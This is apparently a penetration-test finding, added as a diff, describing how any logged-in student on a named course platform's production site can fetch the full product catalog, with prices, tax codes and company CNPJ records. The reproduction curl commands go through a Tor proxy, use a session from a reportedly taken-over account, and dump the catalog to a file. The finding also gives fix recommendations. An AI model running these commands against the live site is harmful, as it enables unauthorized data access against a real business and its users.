@@ -1,0 +1,83 @@
+FINDING F-009: Authenticated Information Disclosure — Full Commercial Catalog & Tenant Company/Tax Data via /portal/getProdutos
+==========================================================================================================================
+Hosts: www.wcursos.com.br (PROD) — confirmed; same endpoint exists on TESTE/WEAD (TESTE requires its own session)
+Severity: MEDIUM (CVSS est. 4.3 — AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N; authenticated, low-sensitivity but broad commercial + tax data)
+Date: 2026-08-27 (Fase 7 — discovered during admin-escalation probing)
+
+## Summary
+Any authenticated portal user (including a low-privilege, course-less STUDENT
+account — confirmed with the F-003 takeover account "SILVANA") can retrieve the
+merchant's COMPLETE product/service catalog together with each product's
+multi-tenant company record (legal name, CNPJ) and tax-classification codes.
+This is commercial/financial data not presented to students in the normal UI
+and discloses the platform's internal multi-tenant structure, full pricing,
+and tax configuration.
+
+## Vulnerable Endpoint
+`GET /portal/getProdutos?format=json` (authenticated; no role check)
+
+## Reproduction (non-destructive, read-only)
+
+### Step 1 — Unauthenticated request is correctly blocked:
+  curl --proxy socks5://127.0.0.1:9050 -sk \
+    "https://www.wcursos.com.br/portal/getProdutos?format=json"
+  -> HTTP 302  Location: /portal/login       (auth is enforced)
+
+### Step 2 — Authenticated student session dumps the whole catalog:
+  curl --proxy socks5://127.0.0.1:9050 -sk -b cookies_post.txt \
+    "https://www.wcursos.com.br/portal/getProdutos?format=json" -o gpr.json
+  -> HTTP 200, 344088 bytes, JSON array of 52 product objects.
+
+### Leaked data (proof, sanitized):
+- 52 products; 39 with non-zero price; max product price R$ 15000.00.
+- Full product fields: id, nome, codigo, link, valor, valorDe, valorDescontoAvista,
+  valorDescontoBoleto, valorDescontoPix, percentualDescontoBoleto, percentualDescontoPix,
+  parcela, parcelaBoleto, parcelaRecorrente, situacao, quantidade, quantidadeVenda,
+  quantidadeVendaConfirmada, numeroMatriculaPermitida, dataLancamento, dataEncerramento,
+  cfop, ncm, codigoICMSCST, codigoIPICST, codigoPISCST, codigoCOFINSCST,
+  valorICMSAliquota, valorIPIAliquota, valorPISAliquota, valorCOFINSAliquota,
+  tipoNF, cfopExterior, cfopFora, idExternoEstudacom, idExternoRedacao, ...
+- **Multi-tenant company records (empresaTO) exposed** — distinct values:
+    id=1   "W COELHO CURSOS LTDA"   razao "WCURSOS"        CNPJ 23.373.950/0001-87
+    id=90  "WEAD"                   razao "WEAD CURSOS LTDA" CNPJ 51.173.429/0001-11
+    id=81  "Empresa de Testes"      razao "Empresa de Testes" (CNPJ empty)   [TEST tenant]
+    id=82  "WRM2"                   razao "WRM2"            (CNPJ empty)    [TEST tenant]
+- Highest-priced real products (sanitized):
+    R$ 15000.00  "Exemplo Produto Link Externo" (+2 copies, codigo Turma exemplo 0X)
+    R$  3490.00  EsFCEx - Enfermeiro (Completo) 2027 EAD 12 Meses
+    R$  2990.00  Marinha Oficial de Carreira Enfermeiro 2027 EAD 09 Meses
+    R$  2100.00  Turma Intensiva - Unirio Enfermeiro 2025 EAD
+    R$  1990.00  Intensiva - Unirio Tecnico de Enfermagem 2025 EAD
+
+## Impact
+- Discloses the merchant's complete commercial strategy: full pricing table,
+  discount ladders (à vista/boleto/PIX), installment plans, launch/closure
+  dates, sale quantities, and stock/matricula caps — competitive intelligence.
+- Discloses internal multi-tenant structure and the LEGAL/TAX identity of each
+  tenant (company legal name + CNPJ for the PROD and WEAD companies), plus two
+  internal TEST tenant companies ("Empresa de Testes", "WRM2") — confirming a
+  vendor-side multi-tenant SaaS where each tenant's company data is reachable
+  by any student of any tenant.
+- Tax-classification data (CFOP, NCM, ICMS/IPI/PIS/COFINS CST + aliquots, NF
+  type) is exposed — useful for fraud/tax-evasion profiling and confirms the
+  backend is a full e-commerce (com.rlg.ecommerce) instance, not just an LMS.
+- A student account that has purchased NOTHING and is enrolled in NOTHING
+  (SILVANA) retrieves the entire catalog — i.e. the endpoint is not scoped to
+  products the student owns; it returns the whole merchant catalog.
+
+## Reproduction files
+- webapp/gpr.json — full catalog dump (52 products). Contains real CNPJ/
+  pricing data; sanitize before external sharing.
+
+## Recommendation
+1. Scope /portal/getProdutos (and similar catalog endpoints) to the caller's
+   role: students should only see the storefront listing they are entitled to,
+   never the full administrative catalog with tax codes, company CNPJ, sale
+   quantities, and discount ladders.
+2. Strip empresaTO (CNPJ, razao social) and tax fields (CFOP/NCM/CST/aliquots)
+   from any student-facing catalog response.
+3. Apply role-based authorization (a filter, not just in-controller checks)
+   to catalog/admin endpoints — see the access-control design note in F-008.
+4. Consider whether /portal/getProdutos should exist at all on the student
+   portal (it appears to be a backoffice/catalog-management endpoint exposed
+   on the student surface).
